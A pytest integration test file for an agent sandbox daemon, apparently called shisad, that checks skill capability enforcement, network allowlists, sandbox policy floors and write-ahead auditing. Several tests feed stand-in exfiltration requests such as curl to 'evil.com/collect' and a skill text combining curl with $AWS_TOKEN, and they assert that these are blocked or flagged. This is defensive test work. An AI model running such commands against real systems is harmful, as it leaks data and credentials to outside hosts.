"""M4 integration coverage for skill runtime, policy floor, and audit durability."""

from __future__ import annotations

import asyncio
import sys
from contextlib import suppress
from pathlib import Path
from typing import Any

import pytest
import yaml

from shisad.core.api.transport import ControlClient
from shisad.core.config import DaemonConfig
from shisad.core.events import EventBus
from shisad.daemon.runner import run_daemon


def _manifest_payload(
    *,
    name: str,
    version: str = "1.0.0",
    description: str = "safe skill",
    signature: str = "",
) -> dict[str, Any]:
    return {
        "manifest_version": "1.0.0",
        "name": name,
        "version": version,
        "author": "trusted-dev",
        "signature": signature,
        "source_repo": "https://github.com/trusted-dev/skills",
        "description": description,
        "capabilities": {
            "network": [],
            "filesystem": [],
            "shell": [],
            "environment": [],
        },
        "dependencies": [],
    }


def _write_skill(root: Path, *, manifest: dict[str, Any], files: dict[str, str]) -> Path:
    root.mkdir(parents=True, exist_ok=True)
    (root / "skill.manifest.yaml").write_text(
        yaml.safe_dump(manifest, sort_keys=False),
        encoding="utf-8",
    )
    for relative, content in files.items():
        path = root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content, encoding="utf-8")
    return root


async def _wait_for_socket(path: Path, timeout: float = 2.0) -> None:
    end = asyncio.get_running_loop().time() + timeout
    while asyncio.get_running_loop().time() < end:
        if path.exists():
            return
        await asyncio.sleep(0.01)
    raise TimeoutError(f"Timed out waiting for socket {path}")


@pytest.fixture
def model_env(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("SHISAD_MODEL_BASE_URL", "https://api.example.com/v1")
    monkeypatch.setenv("SHISAD_MODEL_PLANNER_BASE_URL", "https://planner.example.com/v1")
    monkeypatch.setenv("SHISAD_MODEL_EMBEDDINGS_BASE_URL", "https://embed.example.com/v1")
    monkeypatch.setenv("SHISAD_MODEL_MONITOR_BASE_URL", "https://monitor.example.com/v1")


async def _start_daemon(tmp_path: Path) -> tuple[asyncio.Task[None], ControlClient]:
    return await _start_daemon_with_policy(tmp_path, policy=None)


async def _start_daemon_with_policy(
    tmp_path: Path,
    *,
    policy: dict[str, Any] | None,
) -> tuple[asyncio.Task[None], ControlClient]:
    if policy is not None:
        (tmp_path / "policy.yaml").write_text(
            yaml.safe_dump(policy, sort_keys=False),
            encoding="utf-8",
        )
    config = DaemonConfig(
        data_dir=tmp_path / "data",
        socket_path=tmp_path / "control.sock",
        policy_path=tmp_path / "policy.yaml",
        log_level="INFO",
    )
    daemon_task = asyncio.create_task(run_daemon(config))
    client = ControlClient(config.socket_path)
    await _wait_for_socket(config.socket_path)
    await client.connect()
    return daemon_task, client


async def _shutdown(daemon_task: asyncio.Task[None], client: ControlClient) -> None:
    with suppress(Exception):
        await client.call("daemon.shutdown")
    await client.close()
    await asyncio.wait_for(daemon_task, timeout=3)


async def _confirm_tool_execute(
    client: ControlClient,
    result: dict[str, Any],
    *,
    reason: str = "approved for test",
) -> dict[str, Any]:
    assert result.get("confirmation_required") is True
    confirmation_id = str(result.get("confirmation_id", ""))
    assert confirmation_id
    return await client.call(
        "action.confirm",
        {"confirmation_id": confirmation_id, "reason": reason},
    )


@pytest.mark.asyncio
async def test_m4_t10_skill_with_undeclared_capability_blocked_at_runtime(
    model_env: None,
    tmp_path: Path,
) -> None:
    daemon_task, client = await _start_daemon_with_policy(
        tmp_path,
        policy={"skills": {"require_signature_for_auto_install": False}},
    )
    try:
        skill_manifest = _manifest_payload(name="runtime-guard-skill")
        skill_manifest["capabilities"]["network"] = [
            {"domain": "api.good.com", "reason": "api"}
        ]
        skill = _write_skill(
            tmp_path / "skill_runtime",
            manifest=skill_manifest,
            files={"SKILL.md": "safe helper"},
        )
        decision = await client.call(
            "skill.install",
            {"skill_path": str(skill), "approve_untrusted": True},
        )
        assert decision["status"] == "installed"

        created = await client.call("session.create", {"channel": "cli"})
        sid = created["session_id"]
        result = await client.call(
            "tool.execute",
            {
                "session_id": sid,
                "skill_name": "runtime-guard-skill",
                "tool_name": "shell_exec",
                "command": [sys.executable, "-c", "print('noop')"],
                "network_urls": ["https://evil.com/collect"],
                "degraded_mode": "fail_open",
                "security_critical": False,
            },
        )
        assert result["allowed"] is False
        assert "undeclared_network" in str(result["reason"])
    finally:
        await _shutdown(daemon_task, client)


@pytest.mark.asyncio
async def test_m4_t11_skill_update_requires_review_when_policy_demands(
    model_env: None,
    tmp_path: Path,
) -> None:
    daemon_task, client = await _start_daemon_with_policy(
        tmp_path,
        policy={"skills": {"require_signature_for_auto_install": False}},
    )
    try:
        v1 = _write_skill(
            tmp_path / "update_v1",
            manifest=_manifest_payload(name="update-reviewed-skill", version="1.0.0"),
            files={"SKILL.md": "safe helper"},
        )
        first = await client.call(
            "skill.install",
            {"skill_path": str(v1), "approve_untrusted": True},
        )
        assert first["status"] == "installed"

        v2 = _write_skill(
            tmp_path / "update_v2",
            manifest=_manifest_payload(name="update-reviewed-skill", version="1.0.1"),
            files={"SKILL.md": "safe helper v2"},
        )
        second = await client.call(
            "skill.install",
            {"skill_path": str(v2), "approve_untrusted": True},
        )
        assert second["status"] == "review"
        assert second["reason"] == "update_requires_review"
    finally:
        await _shutdown(daemon_task, client)


@pytest.mark.asyncio
async def test_m4_t12_profile_then_lock_captures_actual_capabilities(
    model_env: None,
    tmp_path: Path,
) -> None:
    daemon_task, client = await _start_daemon(tmp_path)
    try:
        profile_skill = _write_skill(
            tmp_path / "profiled_skill",
            manifest=_manifest_payload(name="profiled-capability-skill"),
            files={"SKILL.md": "curl https://api.good.com/v1 and use $AWS_TOKEN"},
        )
        profile = await client.call(
            "skill.profile",
            {"skill_path": str(profile_skill)},
        )
        assert "api.good.com" in profile["network_domains"]
        assert "AWS_TOKEN" in profile["environment_vars"]
        audit = await client.call(
            "audit.query",
            {"event_type": "SkillProfiled", "limit": 20},
        )
        profiled = [
            item
            for item in audit["events"]
            if str(item.get("data", {}).get("skill_name", "")) == "profiled-capability-skill"
        ]
        assert profiled
        capabilities = profiled[0].get("data", {}).get("capabilities", {})
        assert "api.good.com" in capabilities.get("network", [])
        assert "AWS_TOKEN" in capabilities.get("environment", [])
    finally:
        await _shutdown(daemon_task, client)


@pytest.mark.asyncio
async def test_m4_rr9_tool_execute_unknown_tool_rejected(
    model_env: None,
    tmp_path: Path,
) -> None:
    daemon_task, client = await _start_daemon(tmp_path)
    try:
        created = await client.call("session.create", {"channel": "cli"})
        sid = created["session_id"]
        with pytest.raises(RuntimeError, match=r"unknown tool"):
            await client.call(
                "tool.execute",
                {
                    "session_id": sid,
                    "tool_name": "unknown.tool",
                    "command": [sys.executable, "-c", "print('noop')"],
                },
            )
    finally:
        await _shutdown(daemon_task, client)


@pytest.mark.asyncio
async def test_m4_rr10_default_tool_execute_omission_uses_fail_closed_posture(
    model_env: None,
    tmp_path: Path,
) -> None:
    daemon_task, client = await _start_daemon(tmp_path)
    try:
        created = await client.call("session.create", {"channel": "cli"})
        sid = created["session_id"]
        result = await client.call(
            "tool.execute",
            {
                "session_id": sid,
                "tool_name": "shell.exec",
                "command": [sys.executable, "-c", "print('ok')"],
                "sandbox_type": "vm",
            },
        )
        assert result["allowed"] is False
        confirmed = await _confirm_tool_execute(client, result)
        assert confirmed["confirmed"] is False

        rejected = await client.call(
            "audit.query",
            {"event_type": "ToolRejected", "session_id": sid, "limit": 20},
        )
        reasons = [
            str(item.get("data", {}).get("reason", ""))
            for item in rejected["events"]
            if str(item.get("data", {}).get("actor", "")) == "tool_runtime"
        ]
        assert "degraded_enforcement" in reasons
    finally:
        await _shutdown(daemon_task, client)


@pytest.mark.asyncio
async def test_m4_rr11_http_request_requires_explicit_non_wildcard_allowlist(
    model_env: None,
    tmp_path: Path,
) -> None:
    daemon_task, client = await _start_daemon(tmp_path)
    try:
        created = await client.call("session.create", {"channel": "cli"})
        sid = created["session_id"]
        with pytest.raises(
            RuntimeError,
            match=r"http_request wildcard domains are not allowed",
        ):
            await client.call(
                "tool.execute",
                {
                    "session_id": sid,
                    "tool_name": "http_request",
                    "command": [sys.executable, "-c", "print('noop')"],
                    "network_urls": ["https://api.good.com/v1"],
                    "degraded_mode": "fail_open",
                    "security_critical": False,
                },
            )
        with pytest.raises(RuntimeError, match=r"http_request wildcard domains are not allowed"):
            await client.call(
                "tool.execute",
                {
                    "session_id": sid,
                    "tool_name": "http_request",
                    "command": [sys.executable, "-c", "print('noop')"],
                    "network_urls": ["https://api.good.com/v1"],
                    "network": {"allow_network": True, "allowed_domains": ["*"]},
                    "degraded_mode": "fail_open",
                    "security_critical": False,
                },
            )
    finally:
        await _shutdown(daemon_task, client)


@pytest.mark.asyncio
async def test_m4_rr12_skill_runtime_extracts_network_hosts_from_command_tokens(
    model_env: None,
    tmp_path: Path,
) -> None:
    daemon_task, client = await _start_daemon_with_policy(
        tmp_path,
        policy={"skills": {"require_signature_for_auto_install": False}},
    )
    try:
        skill_manifest = _manifest_payload(name="token-url-guard")
        skill_manifest["capabilities"]["network"] = [
            {"domain": "api.good.com", "reason": "api"}
        ]
        skill_manifest["capabilities"]["shell"] = [
            {"command": "curl", "reason": "fetch"},
        ]
        skill = _write_skill(
            tmp_path / "token_url_guard",
            manifest=skill_manifest,
            files={"SKILL.md": "safe helper"},
        )
        decision = await client.call(
            "skill.install",
            {"skill_path": str(skill), "approve_untrusted": True},
        )
        assert decision["status"] == "installed"

        created = await client.call("session.create", {"channel": "cli"})
        sid = created["session_id"]
        result = await client.call(
            "tool.execute",
            {
                "session_id": sid,
                "skill_name": "token-url-guard",
                "tool_name": "shell_exec",
                "command": ["curl", "https://evil.com/collect"],
                "degraded_mode": "fail_open",
                "security_critical": False,
            },
        )
        assert result["allowed"] is False
        assert "undeclared_network:evil.com" in str(result["reason"])
    finally:
        await _shutdown(daemon_task, client)


@pytest.mark.asyncio
async def test_m4_t25_tool_execute_narrows_caller_wildcard_to_server_allowlist(
    model_env: None,
    tmp_path: Path,
) -> None:
    policy = {
        "sandbox": {
            "tool_overrides": {
                "shell_exec": {
                    "network": {
                        "allow_network": True,
                        "allowed_domains": ["api.good.com"],
                        "deny_private_ranges": True,
                        "deny_ip_literals": True,
                    },
                    "security_critical": False,
                    "degraded_mode": "fail_open",
                }
            }
        }
    }
    (tmp_path / "policy.yaml").write_text(
        yaml.safe_dump(policy, sort_keys=False),
        encoding="utf-8",
    )

    daemon_task, client = await _start_daemon(tmp_path)
    try:
        created = await client.call("session.create", {"channel": "cli"})
        sid = created["session_id"]
        result = await client.call(
            "tool.execute",
            {
                "session_id": sid,
                "tool_name": "shell_exec",
                "command": [sys.executable, "-c", "print('ok')"],
                "network_urls": ["https://evil.com/collect"],
                "network": {"allow_network": True, "allowed_domains": ["*"]},
                "degraded_mode": "fail_open",
                "security_critical": False,
            },
        )
        assert result["allowed"] is False
        assert result.get("confirmation_required") is True
        confirmation_id = str(result.get("confirmation_id", ""))
        assert confirmation_id
        _ = await client.call("action.confirm", {"confirmation_id": confirmation_id})
        rejected = await client.call(
            "audit.query",
            {"event_type": "ToolRejected", "session_id": sid, "limit": 50},
        )
        reasons = [
            str(item.get("data", {}).get("reason", ""))
            for item in rejected["events"]
            if str(item.get("data", {}).get("actor", "")) == "tool_runtime"
        ]
        assert "network:host_not_allowlisted" in reasons
    finally:
        await _shutdown(daemon_task, client)


@pytest.mark.asyncio
async def test_m4_t27_audit_durable_prelaunch_failure_blocks_execution(
    model_env: None,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    original_publish = EventBus.publish

    async def _patched_publish(self: EventBus, event: object) -> None:
        if type(event).__name__ == "SandboxExecutionIntent":
            raise RuntimeError("audit unavailable")
        await original_publish(self, event)  # type: ignore[arg-type]

    monkeypatch.setattr(EventBus, "publish", _patched_publish)
    daemon_task, client = await _start_daemon(tmp_path)
    try:
        created = await client.call("session.create", {"channel": "cli"})
        sid = created["session_id"]
        result = await client.call(
            "tool.execute",
            {
                "session_id": sid,
                "tool_name": "shell_exec",
                "command": [sys.executable, "-c", "print('ok')"],
                "degraded_mode": "fail_open",
                "security_critical": False,
            },
        )
        assert result["allowed"] is False
        confirmed = await _confirm_tool_execute(client, result)
        assert confirmed["confirmed"] is False

        rejected = await client.call(
            "audit.query",
            {"event_type": "ToolRejected", "session_id": sid, "limit": 20},
        )
        reasons = [
            str(item.get("data", {}).get("reason", ""))
            for item in rejected["events"]
            if str(item.get("data", {}).get("actor", "")) == "tool_runtime"
        ]
        assert "audit_unavailable_prelaunch" in reasons
    finally:
        await _shutdown(daemon_task, client)


@pytest.mark.asyncio
async def test_m4_t28_daemon_status_reports_connect_path_capability(
    model_env: None,
    tmp_path: Path,
) -> None:
    daemon_task, client = await _start_daemon(tmp_path)
    try:
        status = await client.call("daemon.status")
        connect_path = status["executors"]["connect_path"]
        assert set(connect_path.keys()) == {
            "method",
            "available",
            "engaged",
            "cap_net_admin_available",
        }
    finally:
        await _shutdown(daemon_task, client)


@pytest.mark.asyncio
async def test_m4_t29_weaker_sandbox_type_request_rejected_and_audited(
    model_env: None,
    tmp_path: Path,
) -> None:
    daemon_task, client = await _start_daemon(tmp_path)
    try:
        created = await client.call("session.create", {"channel": "cli"})
        sid = created["session_id"]
        with pytest.raises(RuntimeError, match="policy floor violation"):
            await client.call(
                "tool.execute",
                {
                    "session_id": sid,
                    "tool_name": "shell_exec",
                    "command": [sys.executable, "-c", "print('ok')"],
                    "sandbox_type": "container",
                },
            )

        rejected = await client.call(
            "audit.query",
            {"event_type": "ToolRejected", "session_id": sid, "limit": 20},
        )
        reasons = [
            str(item.get("data", {}).get("reason", ""))
            for item in rejected["events"]
        ]
        assert any("sandbox_type weaker than server floor" in reason for reason in reasons)
    finally:
        await _shutdown(daemon_task, client)


@pytest.mark.asyncio
async def test_m4_t33_network_enabled_execution_blocks_without_isolated_boundary(
    model_env: None,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(
        "shisad.executors.connect_path.NoopConnectPathProxy.detect_net_admin_capability",
        staticmethod(lambda: False),
    )
    daemon_task, client = await _start_daemon(tmp_path)
    try:
        created = await client.call("session.create", {"channel": "cli"})
        sid = created["session_id"]
        result = await client.call(
            "tool.execute",
            {
                "session_id": sid,
                "tool_name": "http_request",
                "command": [sys.executable, "-c", "print('ok')"],
                "network_urls": ["https://example.com/collect"],
                "network": {
                    "allow_network": True,
                    "allowed_domains": ["example.com"],
                    "deny_private_ranges": True,
                    "deny_ip_literals": True,
                },
                "degraded_mode": "fail_closed",
                "security_critical": True,
            },
        )
        assert result["allowed"] is False
        assert result.get("confirmation_required") is True
        confirmation_id = str(result.get("confirmation_id", ""))
        assert confirmation_id
        _ = await client.call("action.confirm", {"confirmation_id": confirmation_id})
        rejected = await client.call(
            "audit.query",
            {"event_type": "ToolRejected", "session_id": sid, "limit": 50},
        )
        reasons = [
            str(item.get("data", {}).get("reason", ""))
            for item in rejected["events"]
            if str(item.get("data", {}).get("actor", "")) == "tool_runtime"
        ]
        assert any(
            reason
            in {"degraded_enforcement", "connect_path_unavailable", "network:host_not_allowlisted"}
            for reason in reasons
        )
    finally:
        await _shutdown(daemon_task, client)


@pytest.mark.asyncio
async def test_m4_t34_write_ahead_audit_envelope_pairs_action_hash(
    model_env: None,
    tmp_path: Path,
) -> None:
    daemon_task, client = await _start_daemon(tmp_path)
    try:
        created = await client.call("session.create", {"channel": "cli"})
        sid = created["session_id"]
        result = await client.call(
            "tool.execute",
            {
                "session_id": sid,
                "tool_name": "shell_exec",
                "command": [sys.executable, "-c", "print('audit-pair')"],
                "degraded_mode": "fail_open",
                "security_critical": False,
            },
        )
        assert result["allowed"] is False
        confirmed = await _confirm_tool_execute(client, result)
        assert confirmed["confirmed"] is True

        intents = await client.call(
            "audit.query",
            {"event_type": "SandboxExecutionIntent", "session_id": sid, "limit": 50},
        )
        completions = await client.call(
            "audit.query",
            {"event_type": "SandboxExecutionCompleted", "session_id": sid, "limit": 50},
        )
        intent_hashes = {
            str(item["data"]["action_hash"])
            for item in intents["events"]
            if "data" in item and "action_hash" in item["data"]
        }
        completion_hashes = {
            str(item["data"]["action_hash"])
            for item in completions["events"]
            if "data" in item and "action_hash" in item["data"]
        }
        assert intent_hashes
        assert completion_hashes
        assert intent_hashes & completion_hashes
    finally:
        await _shutdown(daemon_task, client)
